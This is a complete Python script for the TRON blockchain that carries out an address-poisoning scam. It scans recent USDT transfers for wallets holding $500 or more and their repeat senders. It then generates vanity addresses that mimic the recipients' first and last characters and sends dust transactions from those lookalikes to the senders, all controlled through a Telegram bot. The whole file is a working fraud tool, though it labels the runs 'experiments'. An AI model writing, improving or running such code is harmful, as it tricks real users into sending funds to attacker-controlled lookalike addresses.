import os
import time
import json
import requests
from datetime import datetime, timedelta, timezone
from tronpy import Tron
from tronpy.keys import PrivateKey

# =========================
# 🟢 USER SETTINGS
# =========================
TARGET_PAIRS = 5             # How many pairs to find before pausing for commands
MIN_BALANCE_USD = 500        
MIN_TRANSFER_USD = 150       
REQUIRED_CONSECUTIVE = 2     
WINDOW_DAYS = 7              

# Estimated Gas Cost per pair (in TRX)
# Tx1 (Main->Vanity) activates the new wallet (~1.1 TRX)
# Tx2 (Vanity->Wallet A) sends the $0 value (~0.1 to 1.1 TRX)
GAS_COST_PER_PAIR_TRX = 2.2 

CEX_KEYWORDS = ['binance', 'okx', 'huobi', 'htx', 'gate', 'kucoin', 'bybit', 'mexc', 'bitfinex', 'coinbase', 'kraken', 'bitget', 'poloniex']

# =========================
# 1. LOAD SECRETS & INITIALIZE
# =========================
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")
TRONGRID_API_KEY = os.environ.get("TRONGRID_API_KEY")
TRONSCAN_API_KEY = os.environ.get("TRONSCAN_API_KEY")
PRIVATE_KEY = os.environ.get("PRIVATE_KEY")

if not all([TELEGRAM_BOT_TOKEN, CHAT_ID, TRONGRID_API_KEY, TRONSCAN_API_KEY, PRIVATE_KEY]):
    raise Exception("Missing GitHub Secrets!")

tron = Tron()
main_wallet = PrivateKey(bytes.fromhex(PRIVATE_KEY.replace('0x', ''))).public_key.to_base58check_address()
TELEGRAM_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

# =========================
# 2. TELEGRAM FUNCTIONS
# =========================
def send_telegram_alert(message, parse_mode="HTML"):
    url = f"{TELEGRAM_URL}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message, "parse_mode": parse_mode, "disable_web_page_preview": True}
    try:
        requests.post(url, json=data, timeout=10)
    except Exception as e:
        print(f"Telegram error: {e}")

def get_telegram_updates(offset):
    """Polls Telegram for new messages from the user."""
    url = f"{TELEGRAM_URL}/getUpdates"
    params = {"offset": offset, "timeout": 30}
    try:
        response = requests.get(url, params=params, timeout=35)
        return response.json().get("result", [])
    except:
        return []

# =========================
# 3. CEX & API HELPERS
# =========================
def check_if_cex(address):
    try:
        headers = {"TRON-PRO-API-KEY": TRONSCAN_API_KEY}
        response = requests.get(f"https://apilist.tronscanapi.com/api/account", params={"address": address}, headers=headers, timeout=10)
        data = response.json()
        tags = data.get("tags", [])
        name = data.get("accountName", "") or data.get("name", "")
        combined_text = " ".join(tags + [name]).lower()
        for keyword in CEX_KEYWORDS:
            if keyword in combined_text: return True, keyword.capitalize()
        return False, None
    except: return False, None

def trongrid_get(path, params=None):
    headers = {"TRON-PRO-API-KEY": TRONGRID_API_KEY}
    try:
        response = requests.get(f"https://api.trongrid.io{path}", params=params or {}, headers=headers, timeout=30)
        return response.json()
    except: return None

def get_usdt_balance(address):
    data = trongrid_get(f"/v1/accounts/{address}/trc20/balance", {"contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"})
    if not data or not data.get("data"): return 0
    return int(data["data"][0].get("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", "0")) / 1_000_000

def get_trx_balance(address):
    data = trongrid_get(f"/v1/accounts/{address}", {"only_confirmed": "true"})
    if not data or not data.get("data"): return 0
    return int(data["data"][0].get("balance", 0)) / 1_000_000

def get_recent_usdt_receivers(limit=50):
    end_ms = int(datetime.now(timezone.utc).timestamp() * 1000)
    start_ms = int((datetime.now(timezone.utc) - timedelta(hours=1)).timestamp() * 1000)
    data = trongrid_get("/v1/transactions/trc20", {
        "only_confirmed": "true", "limit": limit, "order_by": "block_timestamp,desc",
        "min_timestamp": start_ms, "max_timestamp": end_ms, "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
    })
    receivers = set()
    if data and data.get("data"):
        for row in data["data"]: receivers.add(row.get("to"))
    return list(receivers)

# =========================
# 4. VANITY & TRANSFER LOGIC
# =========================
def generate_vanity_wallet(target_address, max_attempts=50000):
    best_addr, best_key, best_score = None, None, 0
    for _ in range(max_attempts):
        key = PrivateKey.random()
        addr = key.public_key.to_base58check_address()
        score = sum(1 for i in range(3) if addr[i] == target_address[i]) + \
                sum(1 for i in range(1, 4) if addr[-i] == target_address[-i])
        if score > best_score:
            best_score = score; best_addr = addr; best_key = key.hex()
            if score >= 6: break
    return best_addr, best_key

def send_zero_value_trx(from_priv_hex, to_address):
    try:
        priv = PrivateKey(bytes.fromhex(from_priv_hex.replace('0x', '')))
        sender = priv.public_key.to_base58check_address()
        txn = tron.trx.transfer(sender, to_address, 1).build().sign(priv) # 1 SUN = $0 value
        result = txn.broadcast()
        return result.txid
    except Exception as e:
        print(f"Transfer error: {e}")
        return None

# =========================
# 5. MAIN INTERACTIVE LOOP
# =========================
def main():
    print(f"🚀 Starting scan. Target: {TARGET_PAIRS} pairs.")
    send_telegram_alert(f"🚀 <b>Scan Started</b>\nTarget: {TARGET_PAIRS} pairs.\nI will pause when found and wait for your commands.")
    
    now = datetime.now(timezone.utc)
    start_ms = int((now - timedelta(days=WINDOW_DAYS)).timestamp() * 1000)
    end_ms = int(now.timestamp() * 1000)
    
    found_pairs = []
    checked_wallets = set()
    
    # --- PHASE 1: SCANNING ---
    while len(found_pairs) < TARGET_PAIRS:
        candidates = get_recent_usdt_receivers(limit=100)
        if not candidates:
            time.sleep(60); continue
            
        for wallet_b in candidates:
            if len(found_pairs) >= TARGET_PAIRS: break
            if wallet_b in checked_wallets: continue
            checked_wallets.add(wallet_b)
            
            is_b_cex, _ = check_if_cex(wallet_b)
            if is_b_cex: continue
                
            usdt_bal = get_usdt_balance(wallet_b)
            trx_bal = get_trx_balance(wallet_b)
            if usdt_bal + (trx_bal * 0.25) < MIN_BALANCE_USD: continue
                
            # Fetch transfers (simplified for speed)
            data = trongrid_get(f"/v1/accounts/{wallet_b}/transactions/trc20", {
                "only_confirmed": "true", "only_to": "true", "limit": 10, "order_by": "block_timestamp,desc",
                "min_timestamp": start_ms, "max_timestamp": end_ms, "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
            })
            if not data or not data.get("data"): continue
            
            transfers = [{"from": r.get("from"), "amount": int(r.get("value", 0))/1_000_000, "txid": r.get("transaction_id")} for r in data["data"]]
            
            for i in range(len(transfers) - 1):
                tx1, tx2 = transfers[i], transfers[i+1]
                if tx1["from"] == tx2["from"] and tx1["amount"] >= MIN_TRANSFER_USD and tx2["amount"] >= MIN_TRANSFER_USD:
                    wallet_a = tx1["from"]
                    is_a_cex, a_cex_name = check_if_cex(wallet_a)
                    found_pairs.append({"wallet_a": wallet_a, "wallet_b": wallet_b, "is_a_cex": is_a_cex, "a_cex_name": a_cex_name, "txids": [tx1["txid"], tx2["txid"]]})
                    send_telegram_alert(f"✅ <b>Pair {len(found_pairs)}/{TARGET_PAIRS} Found!</b>\nA: <code>{wallet_a}</code>{' (CEX)' if is_a_cex else ''}\nB: <code>{wallet_b}</code>")
                    break
        if len(found_pairs) < TARGET_PAIRS: time.sleep(30)

    # --- PHASE 2: INTERACTIVE WAITING ROOM ---
    send_telegram_alert(
        f"🎯 <b>Target Reached! Found {len(found_pairs)} pairs.</b>\n\n"
        f"Please review and use the following commands:\n"
        f"• Type <b>info</b> to see wallet details and total gas cost.\n"
        f"• Type <b>exclude [Address]</b> to remove a wallet from the list.\n"
        f"• Type <b>transfer</b> to execute the $0 vanity transfers."
    )
    
    last_update_id = 0
    execution_triggered = False
    
    print("Entering interactive Telegram polling mode...")
    
    while not execution_triggered:
        updates = get_telegram_updates(last_update_id)
        for update in updates:
            last_update_id = update["update_id"]
            if update.get("message") and str(update["message"].get("chat", {}).get("id")) == str(CHAT_ID):
                text = update["message"].get("text", "").strip()
                
                # COMMAND: INFO
                if text.lower() == "info":
                    total_cost = len(found_pairs) * GAS_COST_PER_PAIR_TRX
                    msg = f"📊 <b>Wallet Information & Cost</b>\n\n"
                    msg += f"Active Pairs: {len(found_pairs)}\n"
                    msg += f"Est. Gas Cost: {GAS_COST_PER_PAIR_TRX} TRX per pair\n"
                    msg += f"<b>Total Required: {total_cost:.2f} TRX</b>\n\n"
                    for i, p in enumerate(found_pairs):
                        cex_tag = f" (A is {p['a_cex_name']})" if p['is_a_cex'] else ""
                        msg += f"<b>Pair {i+1}:</b>\nA: <code>{p['wallet_a']}</code>{cex_tag}\nB: <code>{p['wallet_b']}</code>\n\n"
                    send_telegram_alert(msg)
                
                # COMMAND: EXCLUDE
                elif text.lower().startswith("exclude"):
                    parts = text.split()
                    if len(parts) > 1:
                        addr_to_exclude = parts[1]
                        initial_count = len(found_pairs)
                        found_pairs = [p for p in found_pairs if p['wallet_a'] != addr_to_exclude and p['wallet_b'] != addr_to_exclude]
                        removed = initial_count - len(found_pairs)
                        if removed > 0:
                            send_telegram_alert(f"🗑️ Excluded {removed} pair(s) containing <code>{addr_to_exclude}</code>.")
                        else:
                            send_telegram_alert(f"❌ Address <code>{addr_to_exclude}</code> not found in current list.")
                    else:
                        send_telegram_alert("️ Usage: <b>exclude [Address]</b>")
                
                # COMMAND: TRANSFER
                elif text.lower() == "transfer":
                    if not found_pairs:
                        send_telegram_alert("❌ No pairs left to process!")
                    else:
                        send_telegram_alert(f"🚀 <b>Trigger Accepted!</b>\nExecuting $0 transfers for {len(found_pairs)} pairs...")
                        execution_triggered = True
                        break # Break out of update loop
        
        if not execution_triggered:
            time.sleep(5) # Polling interval

    # --- PHASE 3: EXECUTION ---
    print(f"\n🎯 Executing transfers for {len(found_pairs)} pairs...")
    
    for i, pair in enumerate(found_pairs):
        print(f"\n--- Processing Pair {i+1} ---")
        wallet_b = pair["wallet_b"]
        wallet_a = pair["wallet_a"]
        
        vanity_addr, vanity_priv = generate_vanity_wallet(wallet_b)
        print(f"Generated Vanity: {vanity_addr}")
        
        tx1 = send_zero_value_trx(PRIVATE_KEY, vanity_addr)
        time.sleep(3) # Wait for activation
        
        tx2 = send_zero_value_trx(vanity_priv, wallet_a)
        
        cex_status = f" (Wallet A is {pair['a_cex_name']})" if pair['is_a_cex'] else ""
        msg = (f"🧪 <b>Experiment {i+1} Complete{cex_status}</b>\n"
               f"Vanity: <code>{vanity_addr}</code>\n"
               f"TX1: <code>{tx1}</code>\nTX2: <code>{tx2}</code>")
        send_telegram_alert(msg)
        time.sleep(5)

    send_telegram_alert("🏁 <b>All tasks completed successfully!</b>")
    print("✅ Workflow finished.")

if __name__ == "__main__":
    main()
